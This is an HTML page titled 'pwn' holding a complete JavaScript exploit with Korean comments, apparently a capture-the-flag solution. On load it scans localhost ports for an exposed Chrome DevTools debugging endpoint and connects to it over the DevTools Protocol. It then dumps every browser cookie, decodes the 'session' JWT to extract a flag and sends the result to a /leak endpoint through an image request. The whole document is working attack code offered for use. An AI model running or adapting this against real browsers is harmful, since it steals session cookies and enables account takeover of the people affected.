<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>pwn</title>
</head>
<body>
<script>
(async () => {
  const EXFIL = "/leak"; // 네 서버에서 받는 엔드포인트(같은 오리진으로 가정)
  const COOKIE_NAME = "session";

  function b64urlToUtf8(s) {
    s = s.replace(/-/g, "+").replace(/_/g, "/");
    while (s.length % 4) s += "=";
    const bin = atob(s);
    const bytes = new Uint8Array([...bin].map(c => c.charCodeAt(0)));
    return new TextDecoder().decode(bytes);
  }

  function parseJwtPayload(jwt) {
    const parts = jwt.split(".");
    if (parts.length < 2) throw new Error("bad jwt");
    return JSON.parse(b64urlToUtf8(parts[1]));
  }

  async function fetchJson(url, ms=250) {
    const ac = new AbortController();
    const t = setTimeout(() => ac.abort(), ms);
    try {
      const r = await fetch(url, { signal: ac.signal, cache: "no-store" });
      if (!r.ok) return null;
      return await r.json();
    } catch (e) {
      return null;
    } finally {
      clearTimeout(t);
    }
  }

  // 1) DevTools 포트 찾기: 보통 9222가 아닐 수도 있어 랜덤 포트 스캔
  async function findDevtoolsPort() {
    // 먼저 흔한 후보 몇 개 찔러보고
    const common = [9222, 9223, 9229, 9333, 9515];
    for (const p of common) {
      const j = await fetchJson(`http://127.0.0.1:${p}/json/version`);
      if (j && (j.webSocketDebuggerUrl || j["Browser"])) return p;
    }

    // 그 다음 랜덤/범위 스캔 (로컬은 RST가 빨라서 생각보다 잘 됨)
    let cur = 30000;
    const end = 65000;
    let found = null;

    const workers = 512;        // 너무 높으면 브라우저가 버벅일 수 있음(필요시 128~256으로 낮춰)
    const timeoutMs = 120;

    async function worker() {
      while (true) {
        if (found) return;
        const p = cur++;
        if (p > end) return;

        const j = await fetchJson(`http://127.0.0.1:${p}/json/version`, timeoutMs);
        if (j && (j.webSocketDebuggerUrl || j["Browser"])) {
          found = p;
          return;
        }
      }
    }

    await Promise.race([
      Promise.all(Array.from({ length: workers }, worker)),
      new Promise((_, rej) => setTimeout(() => rej(new Error("port scan timeout")), 9000))
    ]);

    if (!found) throw new Error("devtools port not found");
    return found;
  }

  function cdp(wsUrl) {
    const ws = new WebSocket(wsUrl);
    let nextId = 1;
    const pending = new Map();

    ws.onmessage = (ev) => {
      let msg;
      try { msg = JSON.parse(ev.data); } catch { return; }
      if (msg.id && pending.has(msg.id)) {
        const { resolve, reject } = pending.get(msg.id);
        pending.delete(msg.id);
        if (msg.error) reject(msg.error);
        else resolve(msg.result);
      }
    };

    const ready = new Promise((resolve, reject) => {
      ws.onopen = resolve;
      ws.onerror = reject;
    });

    async function call(method, params={}) {
      await ready;
      const id = nextId++;
      ws.send(JSON.stringify({ id, method, params }));
      return new Promise((resolve, reject) => pending.set(id, { resolve, reject }));
    }

    return { call };
  }

  try {
    const port = await findDevtoolsPort();

    const list = await fetchJson(`http://127.0.0.1:${port}/json/list`, 300);
    if (!Array.isArray(list) || !list.length) throw new Error("no targets");

    // page 타입 하나 잡기
    const page = list.find(t => t.type === "page" && t.webSocketDebuggerUrl) || list.find(t => t.webSocketDebuggerUrl);
    if (!page) throw new Error("no ws target");

    const { call } = cdp(page.webSocketDebuggerUrl);

    await call("Network.enable");
    const cookiesRes = await call("Network.getAllCookies");

    const cookies = cookiesRes.cookies || [];
    const sess = cookies.find(c => c.name === COOKIE_NAME && c.value);
    if (!sess) throw new Error("session cookie not found");

    const payload = parseJwtPayload(sess.value);
    const flag = payload.flag || payload.FLAG || payload.Flag;

    // exfil (같은 오리진으로 /leak 호출)
    const q = encodeURIComponent(flag ? flag : JSON.stringify(payload));
    new Image().src = `${EXFIL}?d=${q}`;
  } catch (e) {
    new Image().src = `/leak?d=${encodeURIComponent("ERR:" + (e && e.message ? e.message : String(e)))}`;
  }
})();
</script>
</body>
</html>
